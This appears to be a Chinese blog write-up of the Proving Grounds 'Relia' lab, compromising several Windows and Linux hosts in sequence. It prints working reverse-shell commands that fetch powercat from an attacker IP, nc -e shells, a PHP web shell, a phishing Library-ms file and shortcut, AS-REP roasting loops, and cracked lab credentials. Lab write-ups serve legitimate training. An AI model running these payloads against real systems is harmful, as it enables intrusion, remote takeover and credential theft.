---
title: Proving Grounds Practive-Challenge 2 - Relia
date: 2025-9-13 20:00:00
tags: 红队
categories: 红队打靶-Windows_Active
---

# 信息收集

## **192.168.236.245**

![image-20250913152926757](./Challenge%202%20-%20Relia/image-20250913152926757.png)

## **192.168.236.246**

![image-20250913153010023](./Challenge%202%20-%20Relia/image-20250913153010023.png)  

## **192.168.236.247**

![image-20250913204715669](./Challenge%202%20-%20Relia/image-20250913204715669.png)

## **192.168.236.248**

![image-20250913164247752](./Challenge%202%20-%20Relia/image-20250913164247752.png)

![image-20250914151624607](./Challenge%202%20-%20Relia/image-20250914151624607.png)

## **192.168.236.249**

![](./Challenge%202%20-%20Relia/image-20250913164324505.png)

## 192.168.236.191

![image-20250913173005944](./Challenge%202%20-%20Relia/image-20250913173005944.png)

## 192.168.236.189

![image-20250913173028476](./Challenge%202%20-%20Relia/image-20250913173028476.png)

## 192.168.236.250

![image-20250913173101605](./Challenge%202%20-%20Relia/image-20250913173101605.png)

# 192.168.*.245

![image-20250913174821205](./Challenge%202%20-%20Relia/image-20250913174821205.png)

![image-20250913174412052](./Challenge%202%20-%20Relia/image-20250913174412052.png)

apache 2.4.49存在目录穿越漏洞

![image-20250913174841383](./Challenge%202%20-%20Relia/image-20250913174841383.png)

筛选了一下可以shell交互的用户

```
root:x:0:0:root:/root:/bin/bash
offsec:x:1000:1000:Offsec Admin:/home/offsec:/bin/bash
miranda:x:1001:1001:Miranda:/home/miranda:/bin/sh
steven:x:1002:1002:Steven:/home/steven:/bin/sh
mark:x:1003:1003:Mark:/home/mark:/bin/sh
anita:x:1004:1004:Anita:/home/anita:/bin/sh
```

查看这些用户下面的`authorized_keys`,只有`anita`用户存在

并且加密类型是`ecdsa`，所以私钥文件是`id_ecdsa`

![image-20250913175226178](./Challenge%202%20-%20Relia/image-20250913175226178.png)

![image-20250913175315574](./Challenge%202%20-%20Relia/image-20250913175315574.png)

使用私钥连接需要密码，使用john破解

![image-20250913175908289](./Challenge%202%20-%20Relia/image-20250913175908289.png)

ssh连接之后上传linpeas.sh进行信息枚举尝试提权

![image-20250913191131594](./Challenge%202%20-%20Relia/image-20250913191131594.png)

下载链接中的`exploit_nss.py`可以成功提权

![image-20250913192425088](./Challenge%202%20-%20Relia/image-20250913192425088.png)



# 192.168.*.246

查看了246主机的web服务，只有一个`Code Validation`

没什么有用的信息，使用上面登录245主机的私钥登录246直接可以登录

本地8000端口存在一个服务，curl可以访问到，我们使用ssh转发到攻击机上看看

![image-20250913201105764](./Challenge%202%20-%20Relia/image-20250913201105764.png)

```
ssh -i id_ecdsa -L 8888:127.0.0.1:8000 anita@192.168.236.246 -p 2222
```

`/var/www`下有两个文件夹,`html`是我们访问192.168.236.246时访问到的`Code Validation`

`internal`就是本地服务的文件夹，这里有文件包含漏洞，可以包含任意文件

![image-20250913202145126](./Challenge%202%20-%20Relia/image-20250913202145126.png)

并且该文件夹下全是以root权限运行，那么包含一个恶意的shell文件以root权限运行就可了,写一个php的反向shell即可

![image-20250913202245770](./Challenge%202%20-%20Relia/image-20250913202245770.png)

但是经过尝试`/tmp`目录和`/home/anita`目录下都不可以被包含

查询了可写目录，最终在`/var/crash`下可以成功包含

```
find / -writable 2>/dev/null  | grep -v '^/proc\|^/run\|^/dev'
```

![image-20250913203943285](./Challenge%202%20-%20Relia/image-20250913203943285.png)

直接得到root权限

![image-20250913204053907](./Challenge%202%20-%20Relia/image-20250913204053907.png)

# 192.168.*.247

## ftp

14020端口ftp存在匿名认证，ftp中有一个pdf

![image-20250913205039977](./Challenge%202%20-%20Relia/image-20250913205039977.png)

其中有一个用户名和密码`mark:OathDeeplyReprieve91`

并且这个用户名和密码可以登录到smb

![image-20250913205607153](./Challenge%202%20-%20Relia/image-20250913205607153.png)

也可以连接到rpc，但是没有有用的信息，并且smbexec这些也不能连接

## web

还有一个14080端口，但是访问之后是400请求

![image-20250913210603387](./Challenge%202%20-%20Relia/image-20250913210603387.png)

通过80端口就可以知道域名是`RELIA`，但是将这个添加到`/etc/hosts`中还是不行

![image-20250913210626711](./Challenge%202%20-%20Relia/image-20250913210626711.png)

对80端口扫目录有个`phpinfo`，主机名是`web02`，所以应该是`relia.com`的子域名，`web02.relia.com`

![image-20250913210944317](./Challenge%202%20-%20Relia/image-20250913210944317.png)

添加到/etc/hosts中终于可以成功访问了

这个就是前面pdf中提到的`umbraco`，

登录界面是要输入邮箱，前面pdf中也有mark@relia.com，然后配合pdf中的密码就成功登录了

![image-20250913211152983](./Challenge%202%20-%20Relia/image-20250913211152983.png)

其中有版本号，该版本存在rce漏洞

![image-20250913211514856](./Challenge%202%20-%20Relia/image-20250913211514856.png)

[noraj/Umbraco-RCE：Umbraco CMS 7.12.4 - （已验证）远程代码执行 --- noraj/Umbraco-RCE: Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution](./https://github.com/noraj/Umbraco-RCE)

可以成功命令执行

![image-20250913211755321](./Challenge%202%20-%20Relia/image-20250913211755321.png)

上传powercat.ps1，利用powercat反弹shell

```
python3 exploit.py -u mark@relia.com -p OathDeeplyReprieve91 -i "http://web02.relia.com:14080" -c powershell.exe -a "-NoProfile -Command IEX(New-Object System.Net.WebClient).DownloadString(' http://192.168.45.222:8000/powercat.ps1 '); powercat -c 192.168.45.222 -p 443 -e powershell"
```

`whoami /priv`存在`SeImpersonatePrivilege`权限，利用**[GodPotato](./https://github.com/BeichenDream/GodPotato)**提权

```
GodPotato-NET4.exe -cmd "cmd /c whoami"
```

![image-20250913213458392](./Challenge%202%20-%20Relia/image-20250913213458392.png)

利用GodPotato去执行反向shell

```
./GodPotato-NET4.exe -cmd "nc.exe -e cmd 192.168.45.222 8003"
```

![image-20250913214217549](./Challenge%202%20-%20Relia/image-20250913214217549.png)

# 192.168.*.248

这个服务器下的web服务有个登录接口，并且尝试弱密码`admin:password`登陆成功

![image-20250913165736325](./Challenge%202%20-%20Relia/image-20250913165736325.png)

这里有个账户`emma`

并且smb可以不用密码访问，将transfer中的所有内容下载到本地

```
smbclient //192.168.234.248/transfer
recurse	ON			#开启递归，开启后会以目录递归方式运行mget和mput命令
prompt OFF			#关闭交互，开启后，下载文件时不再要求输入y/n确认
mget *				#批量获取文件，*是一个调配符，递归遍历时，任何文件名符合
```

将文件下载到本地之后可以`ls -R *` `-R`是递归查找

可以发现`r14_2022/build/DNN/wwwroot/web.config`中有一个数据库连接账号密码

![image-20250914151438173](./Challenge%202%20-%20Relia/image-20250914151438173.png)

`dnnuser:DotNetNukeDatabasePassword!`

49965端口是数据库,通过sqlcmd可以连接，但是数据库中就只有管理员的账号密码，弱密码我们也已经登录上去了

```
./sqlcmd -S 192.168.234.248:49965 -U dnnuser -P DotNetNukeDatabasePassword!
```

**KDBX文件是KeePass软件的数据库文件格式**，KeePass是一款广泛使用的密码管理工具，旨在帮助用户安全地存储和管理各种密码、账户信息等敏感数据。

![image-20250914152511134](./Challenge%202%20-%20Relia/image-20250914152511134.png)

```
keepass2john Database.kdbx > key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt key.hash 
```

破解之后得到一个密码`welcome1`

![image-20250914152934641](./Challenge%202%20-%20Relia/image-20250914152934641.png)

然后去登录`keepass`,其中有一些账号密码

`sa:SAPassword_1998`

`emma:SomersetVinyl1!`

`Michael321:12345`

`bo:Luigi=Papal1963`

利用这些密码去登录3389端口远程桌面`emma:SomersetVinyl1!`可以成功连接

![image-20250914155641695](./Challenge%202%20-%20Relia/image-20250914155641695.png)

这个AppKey存在于环境变量里，并且发现新用户mark，mark属于系统管理员组，AppKey就是mark用户远程桌面的密码，桌面就有proof.txt

![image-20250914161910157](./Challenge%202%20-%20Relia/image-20250914161910157.png)

# 192.168.*.249

先扫描8000端口，扫到个cms

![image-20250914163756041](./Challenge%202%20-%20Relia/image-20250914163756041.png)

![image-20250914163936754](./Challenge%202%20-%20Relia/image-20250914163936754.png)

站点还在开发，但是其中有版本号，该版本存在经过认证的远程代码执行

继续再扫cms目录，有admin.php，是个登录页面

![image-20250914163914970](./Challenge%202%20-%20Relia/image-20250914163914970.png)

上网查询ritecms的默认密码就是`admin:admin`,成功登录到后台

![image-20250914164029745](./Challenge%202%20-%20Relia/image-20250914164029745.png)

[RiteCMS 3.1.0 - 远程代码执行 (RCE)（已验证）- PHP webapps 漏洞 --- RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated) - PHP webapps Exploit](./https://www.exploit-db.com/exploits/50616)

按照其中的步骤上传pHp文件即可

```
一句话木马
<?php system($_GET[base64_decode('Y21k')]);?>
```

![image-20250914164804227](./Challenge%202%20-%20Relia/image-20250914164804227.png)

然后上传powercat利用powercat反弹shell

```
cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222:8000/powercat.ps1');powercat -c 192.168.45.222 -p 80 -e cmd
```



![image-20250914165202441](./Challenge%202%20-%20Relia/image-20250914165202441.png)

![image-20250914165227815](./Challenge%202%20-%20Relia/image-20250914165227815.png)

![image-20250914165711050](./Challenge%202%20-%20Relia/image-20250914165711050.png)

其中有一个密码`damon:i6yuT6tym@`，并且该用户是系统管理员组

开放了5859端口，利用这个密码可以直接连接

该用户有`SeImpersonatePrivilege`权限，也可以通过`GodPotato-NET4.exe`提权

![image-20250914172204214](./Challenge%202%20-%20Relia/image-20250914172204214.png)

```
GodPotato-NET4.exe -cmd "cmd /c whoami"

.\GodPotato-NET4.exe -cmd "cmd /c C:\xampp\htdocs\cms\media\nc64.exe -e cmd 192.168.45.222 8002"
```

`C:\staging`下有个隐藏目录`.git`，通过`git log`和`git show `查看历史提交记录

![image-20250914173631573](./Challenge%202%20-%20Relia/image-20250914173631573.png)

其中有一组密码和新用户

maildmz@relia.com:DPuBT9tGCBrTbR

还有新用户jim@relia.com，这个人负责邮件服务器，有问题给他发邮件

# 192.168.*.189

这里按照wp是要发钓鱼邮件给jim，通过滥用windows库文件执行客户端攻击，但是我`config.Library-ms`创建了无法访问开启的web服务

kali开启webdav服务

```
安装wsgidav
 
pip3 install wsgidav

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /tmp/kali/

```

创建一个恶意的可执行文件，文件名为**config.Library-ms**，这个文件会请求url中的文件，将文件下载到本地

<font color=red>使用时只需要修改url即可</font>

```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.222</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

可以将恶意快捷方式或者后门木马放在web服务器上，然后运行上述的文件去访问，再引导受害者去访问我们的木马文件

创建文件内容为如下的快捷方式

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.222:8000/powercat.ps1');powercat -c 192.168.45.222 -p 4444 -e powershell"
```

把config.Library-ms文件通过邮件发给jim就好了

nc监听等待反弹shell即可

连接成功后执行`net user /domain`可以看到更多的用户名，添加到密码本中

```
Administrator            andrea                   anna
brad                     dan                      Guest
iis_service              internaladmin            jenny
jim                      krbtgt                   larry
maildmz                  michelle                 milana
mountuser
```

发现了一个可疑的ps文件，C:\Users\jim\Pictures\exec.ps1里面包括三个密码`Castello1!`
、`DPuBT9tGCBrTbR`和`UsernameAndPassword`。
具体的内容的话，应该就是和我们之前的钓鱼邮件有关。
不过他是jim自动运行的，所以修改内容也没有意义。
在jim的document里面发现了一个kdbx，john破解后密码为`mercedes1`，打开后发现了两个账号，分别是
`dmzadmin:SlimGodhoodMope`，`jim@relia.com:Castello1!`
通过ipconfig可知这台靶机其实是172.16.xxx.14，而不是189，也就是说189其实是台mail服务器，我们真正拿下的是jim发送邮件使用的的靶机。
当然通过之前发现的ps1文件也能得到相同的结果。我们可以ping下mail.relia.com，其实是172.16.xxx.5,应该就是189的。
并且jim是域下的用户，我们知道域的ip是.6，那么直接用GetNPUsers来找下不需要Kerberos域认证(UF_DONT_REQUIRE_PREAUTH)的用户

```
for user in $(cat ~/Desktop/user); do impacket-GetNPUsers   -no-pass -dc-ip 172.16.82.6 relia.com/${user} ;done 
```

得到了michelle的票据，拿着john破解得到密码`NotMyPassword0k?`
使用GetUserSPNs也能获取iis_service的票据但是john没法破解出来
`impacket-GetUserSPNs -request -dc-ip 172.16.82.6 relia.com/michelle:'NotMyPassword0k?'`

# 192.168.*.191

`dmzadmin:SlimGodhoodMope`通过这个直接可以远程桌面连接到191主机，并且还是系统权限

